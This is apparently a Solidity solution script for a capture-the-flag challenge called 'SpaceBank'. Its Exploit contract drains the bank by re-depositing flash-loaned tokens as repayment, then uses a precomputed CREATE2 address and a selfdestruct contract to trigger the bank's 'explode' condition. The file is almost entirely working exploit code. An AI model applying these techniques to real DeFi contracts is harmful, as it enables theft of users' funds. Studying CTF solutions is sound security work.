// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";
import "src/SpaceBank.sol";
import "forge-std/console.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;
    bytes creationCode;
    uint256 numberOfFlashloans;
    uint256 attackCalls;
    SpaceBank spaceBank;
    IERC20 spaceToken;

    constructor(Challenge challenge) payable {
        CHALLENGE = challenge;
        creationCode = type(selfDestroy).creationCode;
        spaceBank = CHALLENGE.SPACEBANK();
        spaceToken = spaceBank.token();
    }

    function exploit() external {
        if (attackCalls == 1) {
            spaceBank.explodeSpaceBank();
            return;
        }

        spaceToken.approve(address(spaceBank), 10000000);
        require(spaceToken.balanceOf(address(spaceBank)) == 1000, "Not 1000 tokens");
        spaceBank.flashLoan(999, address(this));
        spaceBank.withdraw(999);
        require(spaceToken.balanceOf(address(spaceBank)) == 1, "Not 1 token");
        spaceBank.flashLoan(1, address(this));
        spaceBank.withdraw(1);
        attackCalls++;
    }

    function computeAddress() public returns (address) {
        bytes32 salt = bytes32(block.number);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), spaceBank, salt, keccak256(creationCode)));

        return address(uint160(uint256(hash)));
    }

    function executeFlashLoan(uint256 amount) external {
        numberOfFlashloans++;

        if (numberOfFlashloans == 1) {
            uint256 result = block.number % 47;
            bytes memory data = abi.encode(result);
            spaceBank.deposit(amount, data);
        } else {
            payable(address(computeAddress())).transfer(address(this).balance); //Note the attacker contract should have eth for this to work
            bytes memory data = creationCode;
            spaceBank.deposit(amount, data);
        }
    }
}

contract selfDestroy {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}

contract Solve is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        console.log("solved?", challenge.isSolved());

        Exploit exploit = new Exploit{value: 10 ether}(challenge);
        exploit.exploit();

        // Wait two blocks.

        // Exploit(0xc4CF4760Eacf1D7f99b4778107C2291398900196).exploit();

        console.log("solved?", challenge.isSolved());
    }
}